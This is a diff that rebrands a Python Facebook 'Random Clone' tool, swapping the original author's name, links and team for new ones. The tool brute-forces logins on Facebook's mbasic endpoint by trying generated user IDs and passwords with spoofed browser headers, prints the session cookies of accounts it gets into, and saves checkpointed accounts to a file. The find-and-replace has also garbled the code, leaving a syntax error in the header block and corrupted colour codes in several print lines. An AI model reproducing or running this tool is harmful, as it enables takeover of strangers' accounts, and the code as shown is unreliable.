@@ -310,7 +310,7 @@ for xd in range(10000):
 
     ugen.append(uaku2)
 
-os.system('xdg-open https://github.com/TBBCYBERZONE')
+os.system('xdg-open https://github.com/SF-HASAN')
 
 
 
@@ -325,20 +325,20 @@ logo = ("""
                                           
             
 
-                                  \x1b[1;96mTUSHAR \x1b[1;94mTUSHAR \033[1;31mTUSHAR \033[1;32mSARKER                                                  
+                                  \x1b[1;96mHASAN \x1b[1;94mHASAN \033[1;31mHASAN \033[1;32mMAHMUD                                                  
 
 
 
      \033[1;32m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m═DCCS-TEAM═\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m═══
 
-     \x1b[1;96m Author       : \033[1;32m        TUSHAR SARKER
-     \x1b[1;96m Facebook     :  \033[1;32m       MD TUSHAR SARKER 
+     \x1b[1;96m Author       : \033[1;32m        HASAN HASAN
+     \x1b[1;96m Facebook     :  \033[1;32m       Hasan Mahmud 
 
-     \x1b[1;96m GitHub       : \033[1;32m         TBBCYBERZONE 
+     \x1b[1;96m GitHub       : \033[1;32m         SF-HASAN 
 
      \x1b[1;96m Tool Status  : \033[1;32m  FREE X ENJOY
 
-     \x1b[1;96m Team         : \033[1;32m   TBB CYBER ZONE 
+     \x1b[1;96m Team         : \033[1;32m   ULTRA-X
 
      \x1b[1;96m Tool Work    :  \033[1;32m  ONLY DATA
 
@@ -366,13 +366,13 @@ class Main:
 
         print(logo)
 
-        os.system('espeak -a 200 "Welcome TUSHAR SARKER project Random Clone"')
+        os.system('espeak -a 200 "Welcome Hasan Mahmud project Random Clone"')
 
         print("\033[1;32m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═DCCS-TEAM═\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m═══")
 
-        print(" [01] RANDOM  NUMBER CLONE \033[1;34m[ULTRA WORKING Tested By TUSHAR]")
+        print(" [01] RANDOM  NUMBER CLONE \033[1;34m[ULTRA WORKING Tested By HASAN]")
 
-        print(" [02] MY fACEBOOK ACCOUNT  \033[1;35m[TUSHAR SARKER] ")
+        print(" [02] MY fACEBOOK ACCOUNT  \033[1;35m[Hasan Mahmud] ")
 
         print(" [00] Exit")
 
@@ -380,7 +380,7 @@ class Main:
 
         Alif =input(" [?] Choose : ")
 
-        os.system('xdg-open https://m.facebook.com/groups/547086573624546/?ref=share&mibextid=NSMWBT')
+        os.system('xdg-open https://www.facebook.com/asiea.asiea.94')
 
         if Alif in ["1", "01"]:
 
@@ -388,7 +388,7 @@ class Main:
 
         if Alif in ["2","02"]:
 
-            os.system('xdg-open https://m.facebook.com/groups/547086573624546/?ref=share&mibextid=NSMWBT')
+            os.system('xdg-open https://www.facebook.com/asiea.asiea.94')
 
         if Alif in [" 0", "00"]:
 
@@ -438,7 +438,7 @@ def num():
 
         print(logo)
 
-        os.system('espeak -a 200 "Random cloning Started TUSHAR SARKER"')
+        os.system('espeak -a 200 "Random cloning Started Hasan Mahmud"')
 
         tl = str(len(user))
 
@@ -486,7 +486,7 @@ def rcrack1(uid,pwx,tl):
 
             session = requests.Session()
 
-            sys.stdout.write('\r[\033[1;92mTUSHAR\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
+            sys.stdout.write('\r[\033[1;92mHASAN\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
 
             sys.stdout.flush()
 
@@ -512,26 +512,39 @@ def rcrack1(uid,pwx,tl):
 
             "login":"Log In"}
 
-    headers = {'authority': 'mbasic.facebook.com',
-    'method':'POST',
-    'path':'/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl',
-    'scheme':'https',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    'referer': 'https://www.google.com/',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"11.0.0"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'cross-site',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
+            header_freefb = {'authority': 'mbasic.facebook.com',
+
+            'method':'POST',
+
+            'path':'/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl',
+
+            'scheme':'https',
+
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+
+            'accept-language': 'en-US,en;q=0.9',
+
+            'cache-control': 'max-age=0',
+
+            'referer': 'https://mbasic.facebook.com/',
+
+            'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
+
+            'sec-ch-ua-mobile': '?0',
+
+            'sec-ch-ua-platform': '"Linux"',
+
+            'sec-fetch-dest': 'document',
+
+            'sec-fetch-mode': 'navigate',
+
+            'sec-fetch-site': 'same-origin',
+
+            'sec-fetch-user': '?1',
+
+            'upgrade-insecure-requests': '1',
+
+            'user-agent': pro }5',}
 
             lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
 
@@ -543,7 +556,7 @@ def rcrack1(uid,pwx,tl):
 
                 cid = coki[7:22]
 
-                print(f"\033[38;5;46m[TUSHAR-OK💉] {uid} | {ps}")
+                print(f"\033[38;5;HASANSHAR-OK💉] {uid} | {ps}")
 
                 print(f" Cookie : {coki}")
 
@@ -559,7 +572,7 @@ def rcrack1(uid,pwx,tl):
 
                 cid = coki[82:97]
 
-                print(f"\x1b[38;5;196m[TUSHAR-CP🥴] {uid}|{ps}")
+                print(f"\x1b[38;5;1HASANSHAR-CP🥴] {uid}|{ps}")
 
                 open('/sdcard/cp.txt', 'a').write( uid+' | '+ps+' \n')
 
@@ -573,7 +586,7 @@ def rcrack1(uid,pwx,tl):
 
         loop+=1
 
-        sys.stdout.write(f'\r\033[m[TUSHAR 🔥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+        sys.stdout.write(f'\r\03HASANSHAR 🔥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
 
         sys.stdout.flush()
 
